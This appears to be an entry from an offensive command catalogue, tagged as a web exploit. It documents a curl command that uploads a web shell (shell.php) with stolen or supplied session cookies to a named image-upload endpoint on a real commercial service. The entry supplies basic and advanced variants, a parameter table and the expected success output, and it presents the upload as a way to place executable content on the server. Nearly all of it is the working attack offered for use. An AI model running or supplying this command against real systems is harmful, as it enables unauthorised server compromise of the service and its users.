---
data: >-
  curl -X POST -b cookies.txt -F "file=@shell.php"
  https://www.semrush.com/my_reports/api/v1/upload/image
tags:
  - web-exploit
  - file-upload
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.775Z'
id: abdd0238-56d1-4369-8559-666a7b329cef
verified: false
validated: true
submitted: true
---
# curl-upload-malicious-file

## Command

```bash
curl -X POST -b cookies.txt -F "file=@shell.php" https://www.semrush.com/my_reports/api/v1/upload/image
```

## Description

This command uses curl to perform a multipart file upload to the vulnerable Semrush endpoint, attaching a local malicious file (shell.php) and including an authentication cookie for session validation. It exploits the lack of file restrictions to place potentially executable content on the server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-b cookies.txt` | Loads cookies from file for authentication | Yes |
| `-F "file=@shell.php"` | Attaches the local file as form data | Yes |
| `https://www.semrush.com/my_reports/api/v1/upload/image` | Target endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -b cookies.txt -F "file=@shell.php" https://www.semrush.com/my_reports/api/v1/upload/image
```

### Advanced Usage

```bash
curl -X POST -b cookies.txt -F "file=@shell.php" -F "other_param=value" -v https://www.semrush.com/my_reports/api/v1/upload/image
```

## Expected Output

A successful response might be a JSON object like {"success": true, "file_id": "abc123", "path": "/uploads/shell.php"}, indicating the file was uploaded without rejection. Errors would show 403/500 if authentication fails or validation blocks it.

## Related

- [[Related Procedure|procedures/Exploit-Unrestricted-File-Upload-in-Semrush-My-Reports]]
